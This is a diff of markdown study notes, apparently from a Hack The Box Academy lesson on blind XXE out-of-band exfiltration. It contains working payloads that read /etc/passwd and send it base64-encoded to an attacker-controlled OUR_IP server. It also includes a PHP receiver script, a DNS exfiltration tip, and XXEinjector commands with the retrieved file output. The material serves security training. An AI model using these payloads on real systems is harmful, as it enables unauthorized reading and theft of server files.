@@ -1,27 +1,26 @@
 ---
 sticker: emoji//1f578-fe0f
 ---
-
-# Blind Data Exfiltration
-
 In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.
 
-***
+---
 
-### Out-of-band Data Exfiltration
+## Out-of-band Data Exfiltration
 
-If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) and the [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.
+If we try to repeat any of the methods with the exercise we find at `/blind`, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) and the [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.
 
-In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
+In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
 
-To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:
+To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:
+
 
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
 
-If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
+If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
+
 
 ```php
 <?php
@@ -31,7 +30,8 @@ if(isset($_GET['content'])){
 ?>
 ```
 
-So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:
+So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:
+
 
 ```shell-session
 smoothment@htb[/htb]$ vi index.php # here we write the above PHP code
@@ -40,7 +40,8 @@ smoothment@htb[/htb]$ php -S 0.0.0.0:8000
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 ```
 
-Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:
+Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:
+
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -52,11 +53,12 @@ Now, to initiate our attack, we can use a similar payload to the one we used in 
 <root>&content;</root>
 ```
 
-Then, we can send our request to the web application:&#x20;
+Then, we can send our request to the web application: 
 
-![blind\_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)
+![blind_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)
 
 Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:
+
 
 ```shell-session
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
@@ -71,13 +73,13 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...SNIP...
 ```
 
-**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
+**Tip:** In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
 
-***
+---
 
-### Automated OOB Exfiltration
+## Automated OOB Exfiltration
 
-Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
+Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
 
 To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:
 
@@ -88,7 +90,8 @@ Cloning into 'XXEinjector'...
 ...SNIP...
 ```
 
-Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
+Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
+
 
 ```http
 POST /blind/submitDetails.php HTTP/1.1
@@ -107,7 +110,8 @@ Connection: close
 XXEINJECT
 ```
 
-Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
+Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
+
 
 ```shell-session
 smoothment@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
@@ -118,7 +122,7 @@ smoothment@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --fil
 [+] Retrieved data:
 ```
 
-We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
+We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
 
 ```shell-session
 smoothment@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
@@ -130,11 +134,10 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
 Try to use the tool to repeat other XXE methods we learned.
 
-## Question
+# Question
+---
 
-***
-
-![](gitbook/cybersecurity/images/Pasted%20image%2020250217182232.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217182232.png)
 
 We can do the following, first, let's write a `xxe.dtd` file with the following contents:
 
